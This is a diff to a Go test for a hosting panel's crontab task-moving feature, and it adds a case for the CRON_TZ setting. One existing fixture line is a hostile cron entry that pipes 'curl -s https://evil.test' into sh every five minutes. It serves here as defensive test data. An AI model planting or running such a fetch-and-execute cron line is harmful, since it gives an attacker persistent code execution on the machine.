@@ -760,6 +760,8 @@ func TestTasksMoveKeepsTheWholeCrontabForOneLine(t *testing.T) {
 		"untranslatable": moveTaskCrontab + "MAILTO=owner@example.test\n",
 		"not_made_here":  moveTaskCrontab + "*/5 * * * * curl -s https://evil.test | sh\n",
 		"not_utf8_value": moveTaskCrontab + "GREETING=caf\xe9\n",
+		// alpha.150 fix round (F5): a setting cronie reads as part of the schedule.
+		"cron_setting": moveTaskCrontab + "CRON_TZ=Europe/Berlin\n",
 	} {
 		t.Run(name, func(t *testing.T) {
 			host := useTaskTestHost(t)
@@ -767,7 +769,7 @@ func TestTasksMoveKeepsTheWholeCrontabForOneLine(t *testing.T) {
 				t.Fatal(err)
 			}
 			recordPanelCrontab(t, moveTaskCrontab)
-			if name == "not_utf8_value" {
+			if name == "not_utf8_value" || name == "cron_setting" {
 				recordPanelCrontab(t, content)
 			}
 			_ = os.MkdirAll(siteCrontabRecordDir, 0o700)
@@ -783,6 +785,10 @@ func TestTasksMoveKeepsTheWholeCrontabForOneLine(t *testing.T) {
 				}
 			case "not_utf8_value":
 				if resp.Blocking[0].Reason != sitecron.ReasonEnvValue {
+					t.Fatalf("reason %s", resp.Blocking[0].Reason)
+				}
+			case "cron_setting":
+				if resp.Blocking[0].Reason != sitecron.ReasonCronSetting || !strings.Contains(resp.Blocking[0].Text, "CRON_TZ") {
 					t.Fatalf("reason %s", resp.Blocking[0].Reason)
 				}
 			}
